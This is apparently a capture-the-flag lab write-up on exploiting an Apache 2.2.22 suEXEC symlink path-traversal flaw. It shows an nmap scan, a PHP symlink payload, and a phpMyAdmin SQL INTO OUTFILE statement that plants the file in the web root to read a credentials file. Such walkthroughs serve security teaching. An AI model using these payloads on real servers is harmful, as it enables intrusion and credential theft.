# Apache suEXEC vulnerability

When we scan the network to find the open ports, we can get the services versions

```
nmap -sV 192.168.1.22                                                                                                                                                    !
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-28 18:30 CEST
Nmap scan report for borntosechackme.home (192.168.1.22)
Host is up (0.00016s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE    VERSION
21/tcp  open  ftp        vsftpd 2.0.8 or later
22/tcp  open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http       Apache httpd 2.2.22 ((Ubuntu))
143/tcp open  imap       Dovecot imapd
443/tcp open  ssl/http   Apache httpd 2.2.22
993/tcp open  ssl/imaps?
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Apache is running with the version `2.2.22`

After some research, we found this version is vulnerable. The suEXEC vulnerability is a path traversal. We can do a symlink with `/` and a php page to access a files the user `www-data` can read

We can found an exploit here : exploit-db.com/exploits/27397

We can exploit it by uploading a PHP page (with a SQL request in phpmyadmin like in the writeup2)

```php
<?php
    symlink("/", "paths.php");
?>
```

```sql
SELECT 1, '<?php symlink(\"/\", \"paths.php\");?>' INTO OUTFILE '/var/www/forum/templates_c/run.php'
```

We will upload the page with a script `apache_suexec.py`. We can do it manually on the phpmyadmin page

After this, the code need to be run with the page `https://192.168.1.22/forum/templates_c/run.php` (The script do it automatically)

Now, we can naviguate on the machine folders in the page `https://192.168.1.22/forum/templates_c/paths.php`

We can get some credentials on the path `/home/LOOKATME/password`

It's the FTP credentials, now continue the steps of the [*writeup2*](../writeup2.md), starting at the ftp part to be root!

